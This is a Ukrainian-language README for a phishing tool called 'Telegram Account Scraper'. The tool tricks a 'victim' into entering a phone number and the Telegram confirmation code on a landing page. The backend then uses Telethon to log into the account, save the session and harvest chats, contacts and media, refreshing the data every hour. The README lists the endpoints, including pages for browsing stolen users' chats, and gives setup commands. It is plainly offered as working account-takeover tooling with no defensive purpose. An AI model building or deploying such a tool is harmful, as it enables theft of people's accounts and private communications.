# Telegram Account Scraper

## Як працює?
*Жертва вводить номер телефону, після чого в телеграм приходить код-підтвердження який вона має передати нам. Після отримання номеру телефону і коду ми успішно авторизуємось в її акаунт і маючи повний доступ до інформації викачуємо дані чатів і контакти*


## Як працює під капотом?
*Є html файл з формою введення номеру телефону і коду. Юзер вводить номер телефону нажимає Відправити, код приходить на бекенд і кидає запит в телеграм щоб авторизуватись, створюється сесія, але щоб вона була валідна треба код, юзеру приходить код який він вводить в настуну форму на сторінці, цей код відправляється на бекенд і передається в телегерам для того щоб зайти в акаунт, сесія стає валідною і зразу починається вигрузка всіх даних з акаунту які потрібно. Сесія створюється у вигляді файлу в папці sessions, назва файлу сесії формується session_{номер-телефону}. Дані користувача (контакти, медіа і тд) зберігаються в папці users і в підпапці з ніком юзера і його номером телефону. Раз в годину відбувається оновлення даних, при умові що юзер не видалив сам сесію*


## Які бібліотеки, методології і тд використані?
- Бекенд написаний на python на асинхроному фреймворці fastapi;
- Для парсеру телеграму використана бібліотека Telethon;
- База даних sqlite3
- Веб-сервер uvicorn


## Які є ендпоінти?
```http request
GET http://localhost:8000/
Succesful response: Повертає лендінг з формою для телефону і коду
```
```http request
POST http://localhost:8000/send_phone 
Body: {"phone": "+380679998877"}
Succesful response: {"status": "code_sent"}
```
```http request
POST http://localhost:8000/verify_code 
Body: {"code": "42342"}
Succesful response: {"status": "ok"}
```
```http request
GET http://localhost:8000/users
Succesful response: Повертає html зі списком всіх юзерів
```
```http request
GET http://localhost:8000/user/{user_folder}/chats
Succesful response: Повертає html зі списком всіх чатів юзера
```
```http request
GET http://localhost:8000/user/{user_folder}/chats/{chat_id}
Succesful response: Повертає html з конкретним чатом юзера
```

## Як запустити проект?
```python
python -m venv venv
```
```python
source venv/bin/activate
```
```python
pip install fastapi uvicorn jinja2 telethon aiosqlite pydantic
```
```python
uvicorn main:app --reload
```
- *Запуститься на http://localhost:8000*
- *Документація на http://localhost:8000/docs*